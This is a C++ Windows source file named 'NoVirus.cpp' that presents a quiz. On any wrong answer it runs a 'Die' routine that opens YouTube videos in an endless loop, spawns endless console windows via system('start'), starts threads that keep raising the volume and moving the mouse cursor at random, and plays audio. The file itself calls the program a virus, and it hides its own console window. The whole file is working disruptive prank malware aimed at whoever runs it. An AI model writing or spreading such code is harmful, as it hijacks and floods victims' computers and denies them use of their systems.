// NoVirus.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <windows.h>
#include <shellapi.h>
#include <iostream>
#include <thread>
 // Multithreading libary. Uses multiple cpu threads to run code.

#include <mmsystem.h>

#pragma comment(lib, "winmm")
#pragma comment(lib, "winmm.lib")



int score = 0;

using namespace std;
void changeVolume() {
    INPUT ip = { 0 };
    ip.type = INPUT_KEYBOARD;
    ip.ki.wVk = VK_VOLUME_UP;   //or VOLUME_DOWN or MUTE
    SendInput(1, &ip, sizeof(INPUT));
    ip.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &ip, sizeof(INPUT));
}

class Score {
public:
    void Reset() {
        score = 0;
    }

    void Correct() {
        score += 1;
    }

    void Incorrect() {
        score -= 1;
    }

    int GetScore() {
        return score;
    }
};

// Returns true if correct and false if incorrect
void LockVolume() {
    while (true) {
        changeVolume();
    }
}

void randomizeCursor() {
    while (true) {
        SetCursorPos(rand() % 1000, rand() % 800);
    }
}

// Runs the virus if function is called
void Die() {
    for (int i = 0; i < 3; i++) {
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=KE1ynBZ-9Bw", 0, 0, SW_SHOWNORMAL);
    }
    ShellExecute(0, 0, L"https://www.youtube.com/watch?v=ZHmROm_CRH4", 0, 0, SW_SHOWNORMAL);
    std::thread audio (LockVolume);
    std::thread mouse(randomizeCursor);
    PlaySound(TEXT("music.wav"), NULL, SND_FILENAME || SND_ASYNC);
    while (true) {

        // Opens lots of videos
        system("start");
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=1d-n0Qi1ZvQ", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=VAnaq97yoM4", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=ZKWwiMaSoyE", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/WwR4jS8cnW4", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/JgdhiIEToUA", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/ZHmROm_CRH4", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/RV31X3D-B-0", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/whIHfXkpSYs", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/THoNFdCOE_4", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/KE1ynBZ-9Bw", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/1d-n0Qi1ZvQ", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/2FjV_QMh18Y", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/7ufv8zB1mPo", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/qCK-uUbMXNE", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/3t7B5RMaUCM", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/G3uds8f6K0w", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/yHny5fSv5ZI", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/xelvknpdf2s", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/9shiY-3tDBw", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/SCM28ONw2X4", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/1onwkL10mqk", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/ZKWwiMaSoyE", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/2jTmApr0LFc", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/I0DV5H3zDAM", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/eP27fTR1wgk", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/pdL4uVL9-mk", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/VAnaq97yoM4", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/GkWg_tN4VY8", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/yn_7K7pkqwQ", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/2XYat2LRLzQ", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=1d-n0Qi1ZvQ", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=VAnaq97yoM4", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=ZKWwiMaSoyE", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/WwR4jS8cnW4", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/JgdhiIEToUA", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/ZHmROm_CRH4", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/RV31X3D-B-0", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/whIHfXkpSYs", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/THoNFdCOE_4", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/KE1ynBZ-9Bw", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/1d-n0Qi1ZvQ", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/2FjV_QMh18Y", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/7ufv8zB1mPo", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/qCK-uUbMXNE", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/3t7B5RMaUCM", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/G3uds8f6K0w", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/yHny5fSv5ZI", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/xelvknpdf2s", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/9shiY-3tDBw", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/SCM28ONw2X4", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/1onwkL10mqk", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/ZKWwiMaSoyE", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/2jTmApr0LFc", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/I0DV5H3zDAM", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/eP27fTR1wgk", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/pdL4uVL9-mk", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/VAnaq97yoM4", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/GkWg_tN4VY8", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/yn_7K7pkqwQ", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://youtu.be/2XYat2LRLzQ", 0, 0, SW_SHOWNORMAL);
    }
}


bool ask_question(string message, string answerOne, string answerTwo, int correctAnswer) {
    std::cout << message << endl;

    Score score;

    std::cout << "1)" << answerOne << endl;
    std::cout << "2)" << answerTwo << endl;

    string input;

    std::cin >> input;

    if (input == answerOne && correctAnswer == 1 || input == answerTwo && correctAnswer == 2) {
        std::cout << "Correct!" << endl;
        score.Correct();
        std::cout << score.GetScore() << endl;
        return true;
    }
    else {
        std::cout << "Incorrect" << endl;
        score.Incorrect();
        Die();

        return false;
    }
}

int main()
{   
    //+int score = 0;
    std::cout << "Welcome to the quiz, try to make it to the end or else.\n" << "\n";
    ask_question("Is Morbius the best movie in existance?", "no", "yes", 1);
    ask_question("Is taxi 1998 the best movie?", "yes", "no", 1);
    ask_question("Is this a virus", "Yes", "No", 1); // message, answer one, answer two, correct answer (1..2)
    ask_question("Do you know how you contracted this virus?", "Yes", "No", 1); //message, answer one, answer two, correct answer (1..2)
    ask_question("Do you know when this virus was contracted?", "Yes", "No", 1); //message, answer one, answer two, correct answer (1..2)
    
    
    // Hides window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
}
